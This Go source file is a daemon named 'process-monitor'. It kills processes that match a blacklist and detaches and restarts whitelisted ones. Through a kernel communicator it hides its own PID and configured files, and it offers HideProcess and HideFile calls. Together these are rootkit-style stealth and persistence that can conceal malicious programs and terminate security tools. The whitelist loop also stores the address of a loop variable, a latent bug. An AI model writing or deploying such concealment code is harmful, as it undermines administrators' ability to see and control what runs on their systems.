package monitor

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/jrandolph2/process-monitor/internal/config"
	"github.com/jrandolph2/process-monitor/internal/kernel"
)

var (
	ErrProcessNotFound    = fmt.Errorf("process not found")
	ErrProcessTerminated  = fmt.Errorf("process terminated")
	ErrProcessStartFailed = fmt.Errorf("process start failed")
	ErrMaxRestartsExceeded = fmt.Errorf("max restarts exceeded")
)

// ProcessState represents the state of a monitored process
type ProcessState struct {
	PID           int
	Name          string
	IsBlacklisted bool
	IsWhitelisted bool
	LastSeen      time.Time
	RestartCount  int
	Command       string
}

// MonitorStats contains monitoring statistics
type MonitorStats struct {
	BlacklistTerminations int
	WhitelistRestarts     int
	ScansPerformed        int
	ProcessesScanned      int
	LastScanTime          time.Time
	Uptime                time.Duration
}

// Monitor is the main process monitoring engine
type Monitor struct {
	mu                sync.RWMutex
	ctx               context.Context
	cancel            context.CancelFunc
	config            *config.Config
	kernelComm        kernel.KernelCommunicator
	state             map[int]*ProcessState
	stats             MonitorStats
	startTime         time.Time
	blacklistPatterns map[string]string
	whitelistEntries  map[string]*config.ProcessEntry
	restartTrackers   map[string]*restartTracker
}

// restartTracker tracks restart attempts for a process
type restartTracker struct {
	count      int
	lastAttempt time.Time
	lastSuccess time.Time
}

// NewMonitor creates a new process monitor
func NewMonitor(cfg *config.Config, kernelComm kernel.KernelCommunicator) *Monitor {
	ctx, cancel := context.WithCancel(context.Background())

	m := &Monitor{
		ctx:               ctx,
		cancel:            cancel,
		config:            cfg,
		kernelComm:        kernelComm,
		state:             make(map[int]*ProcessState),
		startTime:         time.Now(),
		blacklistPatterns: make(map[string]string),
		whitelistEntries:  make(map[string]*config.ProcessEntry),
		restartTrackers:   make(map[string]*restartTracker),
	}

	// Initialize blacklist patterns
	for _, entry := range cfg.Blacklist {
		m.blacklistPatterns[entry.Name] = entry.Name
	}

	// Initialize whitelist entries
	for _, entry := range cfg.Whitelist {
		m.whitelistEntries[entry.Name] = &entry
	}

	return m
}

// Start begins the monitoring process
func (m *Monitor) Start() error {
	m.mu.Lock()
	defer m.mu.Unlock()

	// Start monitoring goroutines
	go m.scanLoop()
	go m.whitelistHealthCheck()

	// Hide daemon if configured
	if m.config.Monitor.AutoHideDaemon && m.kernelComm != nil {
		selfPID := os.Getpid()
		if err := m.kernelComm.HidePid(selfPID, "process-monitor-daemon"); err != nil {
			// Log but don't fail
			fmt.Printf("Warning: Failed to hide daemon: %v\n", err)
		}
	}

	// Hide configured files
	for _, file := range m.config.HiddenFiles {
		if m.kernelComm != nil {
			if err := m.kernelComm.HideFile(file); err != nil {
				fmt.Printf("Warning: Failed to hide file %s: %v\n", file, err)
			}
		}
	}

	return nil
}

// Stop stops the monitoring process
func (m *Monitor) Stop() error {
	m.cancel()

	// Unhide everything
	if m.kernelComm != nil {
		m.kernelComm.Close()
	}

	return nil
}

// scanLoop is the main scanning loop
func (m *Monitor) scanLoop() {
	ticker := time.NewTicker(m.config.Monitor.ScanInterval)
	defer ticker.Stop()

	for {
		select {
		case <-m.ctx.Done():
			return
		case <-ticker.C:
			m.scanProcesses()
		}
	}
}

// scanProcesses scans all running processes
func (m *Monitor) scanProcesses() {
	m.mu.Lock()
	defer m.mu.Unlock()

	m.stats.ScansPerformed++
	m.stats.LastScanTime = time.Now()

	// Read /proc directory
	procDir, err := os.Open("/proc")
	if err != nil {
		return
	}
	defer procDir.Close()

	entries, err := procDir.Readdirnames(m.config.Monitor.ScanBatchSize)
	if err != nil {
		return
	}

	for _, entry := range entries {
		// Check if entry is a PID
		pid, err := strconv.Atoi(entry)
		if err != nil {
			continue
		}

		m.stats.ProcessesScanned++
		m.inspectProcess(pid)
	}

	// Clean up stale state entries
	m.cleanupStaleStates()
}

// inspectProcess inspects a single process
func (m *Monitor) inspectProcess(pid int) {
	// Read process info
	procPath := filepath.Join("/proc", strconv.Itoa(pid))

	// Read comm file
	commData, err := os.ReadFile(filepath.Join(procPath, "comm"))
	if err != nil {
		// Process may have exited
		delete(m.state, pid)
		return
	}
	comm := strings.TrimSpace(string(commData))

	// Read cmdline file
	cmdlineData, err := os.ReadFile(filepath.Join(procPath, "cmdline"))
	cmdline := ""
	if err == nil {
		cmdline = strings.ReplaceAll(string(cmdlineData), "\x00", " ")
	}

	// Update or create process state
	state := &ProcessState{
		PID:      pid,
		Name:     comm,
		LastSeen: time.Now(),
		Command:  cmdline,
	}

	// Check against blacklist
	if m.isBlacklisted(comm, cmdline) {
		state.IsBlacklisted = true
		m.state[pid] = state
		m.terminateProcess(pid)
		return
	}

	// Check against whitelist
	if m.isWhitelisted(comm) {
		state.IsWhitelisted = true
		m.state[pid] = state
		return
	}

	m.state[pid] = state
}

// isBlacklisted checks if a process is blacklisted
func (m *Monitor) isBlacklisted(comm, cmdline string) bool {
	for _, pattern := range m.config.Blacklist {
		if comm == pattern.Name {
			return true
		}
		if pattern.Path != "" && strings.Contains(cmdline, pattern.Path) {
			return true
		}
		for _, arg := range pattern.Args {
			if strings.Contains(cmdline, arg) {
				return true
			}
		}
	}
	return false
}

// isWhitelisted checks if a process is whitelisted
func (m *Monitor) isWhitelisted(comm string) bool {
	_, ok := m.whitelistEntries[comm]
	return ok
}

// terminateProcess terminates a blacklisted process
func (m *Monitor) terminateProcess(pid int) error {
	// Try SIGTERM first
	process, err := os.FindProcess(pid)
	if err != nil {
		return fmt.Errorf("%w: %v", ErrProcessNotFound, err)
	}

	// Send SIGTERM
	err = process.Signal(syscall.SIGTERM)
	if err != nil {
		// Try SIGKILL
		err = process.Signal(syscall.SIGKILL)
		if err != nil {
			return fmt.Errorf("%w: %v", ErrProcessTerminated, err)
		}
	}

	m.stats.BlacklistTerminations++
	return nil
}

// whitelistHealthCheck ensures whitelisted processes are running
func (m *Monitor) whitelistHealthCheck() {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-m.ctx.Done():
			return
		case <-ticker.C:
			m.checkWhitelistProcesses()
		}
	}
}

// checkWhitelistProcesses checks and restarts whitelisted processes
func (m *Monitor) checkWhitelistProcesses() {
	m.mu.Lock()
	defer m.mu.Unlock()

	for name, entry := range m.whitelistEntries {
		if !entry.AutoStart {
			continue
		}

		// Check if process is running
		running := false
		for _, state := range m.state {
			if state.Name == name {
				running = true
				break
			}
		}

		if !running {
			m.restartWhitelistProcess(entry)
		}
	}
}

// restartWhitelistProcess restarts a whitelisted process
func (m *Monitor) restartWhitelistProcess(entry *config.ProcessEntry) error {
	tracker := m.restartTrackers[entry.Name]
	if tracker == nil {
		tracker = &restartTracker{}
		m.restartTrackers[entry.Name] = tracker
	}

	// Check max restarts
	if entry.MaxRestarts > 0 && tracker.count >= entry.MaxRestarts {
		return fmt.Errorf("%w: %s", ErrMaxRestartsExceeded, entry.Name)
	}

	// Check restart delay
	if tracker.lastAttempt.After(time.Time{}) {
		elapsed := time.Since(tracker.lastAttempt)
		if elapsed < entry.RestartDelay {
			return fmt.Errorf("restart delay not met for %s", entry.Name)
		}
	}

	tracker.count++
	tracker.lastAttempt = time.Now()

	// Determine how to start the process
	var cmd *exec.Cmd
	switch entry.StartMode {
	case "daemon":
		cmd = exec.Command("nohup", entry.Path, entry.Args...)
		cmd.SysProcAttr = &syscall.SysProcAttr{
			Setsid: true,
		}
	case "nohup":
		cmd = exec.Command("nohup", entry.Path)
		cmd.Args = append([]string{"nohup", entry.Path}, entry.Args...)
	default: // direct
		cmd = exec.Command(entry.Path, entry.Args...)
	}

	// Set up environment to break parent-child relationship
	cmd.Env = append(os.Environ(),
		"MONITOR_DAEMON_PID="+strconv.Itoa(os.Getpid()),
	)

	// Start the process
	if err := cmd.Start(); err != nil {
		return fmt.Errorf("%w: %v", ErrProcessStartFailed, err)
	}

	// Don't wait for the process to complete
	go cmd.Wait()

	tracker.lastSuccess = time.Now()
	m.stats.WhitelistRestarts++

	return nil
}

// cleanupStaleStates removes stale process state entries
func (m *Monitor) cleanupStaleStates() {
	now := time.Now()
	staleDuration := 5 * m.config.Monitor.ScanInterval

	for pid, state := range m.state {
		if now.Sub(state.LastSeen) > staleDuration {
			delete(m.state, pid)
		}
	}
}

// GetState returns the current state of all monitored processes
func (m *Monitor) GetState() map[int]*ProcessState {
	m.mu.RLock()
	defer m.mu.RUnlock()

	result := make(map[int]*ProcessState, len(m.state))
	for k, v := range m.state {
		result[k] = v
	}
	return result
}

// GetStats returns monitoring statistics
func (m *Monitor) GetStats() MonitorStats {
	m.mu.RLock()
	defer m.mu.RUnlock()

	stats := m.stats
	stats.Uptime = time.Since(m.startTime)
	return stats
}

// HideProcess hides a process from the process list
func (m *Monitor) HideProcess(pid int, comm string) error {
	if m.kernelComm == nil {
		return fmt.Errorf("kernel communication not available")
	}

	return m.kernelComm.HidePid(pid, comm)
}

// UnhideProcess unhides a process
func (m *Monitor) UnhideProcess(pid int) error {
	if m.kernelComm == nil {
		return fmt.Errorf("kernel communication not available")
	}

	return m.kernelComm.UnhidePid(pid)
}

// HideFile hides a file path
func (m *Monitor) HideFile(path string) error {
	if m.kernelComm == nil {
		return fmt.Errorf("kernel communication not available")
	}

	return m.kernelComm.HideFile(path)
}

// UnhideFile unhides a file path
func (m *Monitor) UnhideFile(path string) error {
	if m.kernelComm == nil {
		return fmt.Errorf("kernel communication not available")
	}

	return m.kernelComm.UnhideFile(path)
}

// IsKernelModuleActive checks if the kernel module is active
func (m *Monitor) IsKernelModuleActive() bool {
	if m.kernelComm == nil {
		return false
	}
	return m.kernelComm.Ping()
}

// ReloadConfig reloads the configuration
func (m *Monitor) ReloadConfig(newConfig *config.Config) error {
	m.mu.Lock()
	defer m.mu.Unlock()

	m.config = newConfig

	// Rebuild patterns
	m.blacklistPatterns = make(map[string]string)
	for _, entry := range newConfig.Blacklist {
		m.blacklistPatterns[entry.Name] = entry.Name
	}

	m.whitelistEntries = make(map[string]*config.ProcessEntry)
	for _, entry := range newConfig.Whitelist {
		m.whitelistEntries[entry.Name] = &entry
	}

	return nil
}

// GetBlacklistPIDs returns PIDs of all blacklisted processes
func (m *Monitor) GetBlacklistPIDs() []int {
	m.mu.RLock()
	defer m.mu.RUnlock()

	var pids []int
	for _, state := range m.state {
		if state.IsBlacklisted {
			pids = append(pids, state.PID)
		}
	}
	return pids
}

// GetWhitelistPIDs returns PIDs of all whitelisted processes
func (m *Monitor) GetWhitelistPIDs() []int {
	m.mu.RLock()
	defer m.mu.RUnlock()

	var pids []int
	for _, state := range m.state {
		if state.IsWhitelisted {
			pids = append(pids, state.PID)
		}
	}
	return pids
}
